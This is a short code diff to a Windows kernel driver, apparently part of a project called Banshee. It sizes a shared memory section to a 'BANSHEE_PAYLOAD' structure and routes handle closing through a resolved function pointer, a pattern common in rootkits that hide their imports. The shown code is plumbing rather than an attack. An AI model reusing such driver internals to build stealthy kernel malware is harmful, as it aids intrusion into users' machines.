@@ -6,7 +6,6 @@
 #include <wdf.h>
 #include <ntddk.h>
 #include "Globals.hpp"
-#include "Misc.hpp"
 #include "WinTypes.hpp"
 #include "ProcessUtils.hpp"
 #include <intrin.h>
@@ -30,7 +29,7 @@ BeCreateSharedMemory()
 	InitializeObjectAttributes(&objAttributes, &sectionName, OBJ_CASE_INSENSITIVE | OBJ_PERMANENT | OBJ_KERNEL_HANDLE | OBJ_OPENIF, NULL, sd);
 	
 	LARGE_INTEGER sectionSize = { 0 };
-	sectionSize.LowPart = 1024 * 10; // TODO
+    sectionSize.LowPart = sizeof(BANSHEE_PAYLOAD);  
 
 	status = ZwCreateSection(&BeGlobals::hSharedMemory, SECTION_ALL_ACCESS, &objAttributes, &sectionSize, PAGE_READWRITE, SEC_COMMIT, NULL);
 	if (status != STATUS_SUCCESS)
@@ -50,9 +49,9 @@ BeCreateSharedMemory()
 	if (status != STATUS_SUCCESS)
 	{
 		LOG_MSG("Failed to map shared memory: 0x%X\n", status);
-		ZwClose(BeGlobals::hSharedMemory);
-  KeUnstackDetachProcess(&apc);
-  ExFreePool(sd);
+		BeGlobals::pZwClose(BeGlobals::hSharedMemory);
+		KeUnstackDetachProcess(&apc);
+		ExFreePool(sd);
 		return STATUS_UNSUCCESSFUL;
 	}
 	LOG_MSG("Mapped shared memory of size at 0x%llx\n", (ULONG_PTR)BeGlobals::pSharedMemory);
@@ -81,7 +80,7 @@ BeCloseSharedMemory(HANDLE hSharedMemory, PVOID pSharedMemory)
 
 	if (BeGlobals::hSharedMemory != NULL) 
 	{
-		ZwClose(hSharedMemory);
+		BeGlobals::pZwClose(hSharedMemory);
 		hSharedMemory = NULL;
 	}
 
